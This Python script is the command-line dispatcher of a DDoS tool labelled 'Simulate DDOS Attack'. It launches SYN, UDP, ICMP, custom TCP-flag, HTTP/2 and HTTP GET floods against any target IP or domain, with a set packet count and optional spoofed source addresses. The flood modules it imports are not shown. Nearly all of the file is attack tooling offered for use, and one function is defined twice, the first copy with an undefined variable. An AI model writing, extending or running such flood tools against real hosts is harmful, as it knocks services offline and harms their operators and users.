#!/usr/bin/python3
from os import system
from sys import stdout
from scapy import *
from scapy.all import *
from random import randint
import argparse

import syn_flood
import icmp_flood
import udp_flood
import choose_tcp_flag
import http2_attack_dos
import get_flood

def get_attack(args):
    if (arg.target_port is None):
        print("Please specify the target port.")
        exit()
    get_flood.get_flood_attack(args.target_ip, int(args.target_port), int(args.count))

def syn_attack(args):
    if (args.target_port is None):
        print("Please specify the target port.")
        exit(1)
    syn_flood.syn_flood_attack(args.target_ip, int(args.target_port), int(args.count), args.source_ip)

def udp_attack(args):
    if (args.target_port is None):
        udp_flood.udp_flood_attack(args.target_ip, 0, int(args.count), args.source_ip)
    else:
        udp_flood.udp_flood_attack(args.target_ip, int(args.target_port), int(args.count), args.source_ip)

def icmp_attack(args):
    icmp_flood.icmp_flood_attack(args.target_ip, int(args.count), args.source_ip)

def choose_flag(args):
    if args.target_port is None: 
        print("Please specify the target port.")
        exit(1)
    choose_tcp_flag.send_packet(args.target_ip, int(args.target_port), int(args.count), args.source_ip, args.flag)
    
def http2_attack(args):
    http2_attack_dos.http2_attack(args.target_ip, int(args.count))

def get_attack(args):
    if args.target_port is None: 
        print("Please specify the target port.")
        exit(1)
    get_flood.get_flood_attack(args.target_ip, int(args.target_port), int(args.count))

attack_dict = {
    "syn": syn_attack,
    "udp": udp_attack,
    "icmp": icmp_attack,
    "choose_flag": choose_flag,
    "http2": http2_attack,
    "get": get_attack
}

def main():
    parser = argparse.ArgumentParser(description = "Simulate DDOS Attack")
    parser.add_argument('-ti', '--target_ip', help='Specify the target IP or Domain. e.g. 127.0.0.1', required=True)
    parser.add_argument('-tp', '--target_port', help="Specify the targrt's port", required=False)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)
    parser.add_argument('-si', '--source_ip', help="Specify source ip by input {file_name}", required=False)
    parser.add_argument('-f', '--flag', help="Enter the TCP Flag that you want to send with no comma. E.g. 'UAPRSF'", required=False)
    parser.add_argument('--attack_type', choices=['syn', 'udp', 'icmp', 'choose_flag', "http2", "get"], help="Specify attack type", required=True)

    args = parser.parse_args()

    attack_function = attack_dict.get(args.attack_type)
    if attack_function:
        attack_function(args)
    else: 
        print(f"unknown attack type: {args.attack_type}")

if __name__ == "__main__":
    main()
